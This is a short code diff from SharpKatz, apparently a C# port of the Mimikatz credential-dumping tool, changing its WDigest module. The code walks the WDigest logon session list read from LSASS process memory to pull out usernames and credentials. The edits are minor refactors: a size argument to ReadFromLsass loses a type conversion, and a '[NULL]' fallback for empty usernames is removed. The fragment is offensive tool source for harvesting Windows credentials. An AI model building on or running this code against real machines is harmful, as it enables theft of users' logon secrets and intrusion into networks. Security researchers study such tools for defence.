@@ -60,14 +60,14 @@ namespace SharpKatz.Module
 
             //Console.WriteLine("[*] l_LogSessList found at address {0:X}", logSessListAddr.ToInt64());
 
-            byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, logSessListAddr, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_WDIGEST_LIST_ENTRY))));
+            byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, logSessListAddr, Marshal.SizeOf(typeof(KIWI_WDIGEST_LIST_ENTRY)));
             IntPtr pThis = new IntPtr(BitConverter.ToInt64(entryBytes, Utility.FieldOffset<KIWI_WDIGEST_LIST_ENTRY>("This")));
 
             llCurrent = pThis;
 
             do
             {
-                entryBytes = Utility.ReadFromLsass(ref hLsass, llCurrent, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_WDIGEST_LIST_ENTRY))));
+                entryBytes = Utility.ReadFromLsass(ref hLsass, llCurrent, Marshal.SizeOf(typeof(KIWI_WDIGEST_LIST_ENTRY)));
                 entry = Utility.ReadStruct<KIWI_WDIGEST_LIST_ENTRY>(entryBytes);
 
                 if (entry.UsageCount == 1)
@@ -85,15 +85,7 @@ namespace SharpKatz.Module
                         LUID luid = entry.LocallyUniqueIdentifier;
 
                         Credential.WDigest wdigestentry = new Credential.WDigest();
-
-                        if (!string.IsNullOrEmpty(username))
-                        {
-                            wdigestentry.UserName = username;
-                        }
-                        else
-                        {
-                            wdigestentry.UserName = "[NULL]";
-                        }
+                        wdigestentry.UserName = username;
 
                         if (!string.IsNullOrEmpty(hostname))
                         {
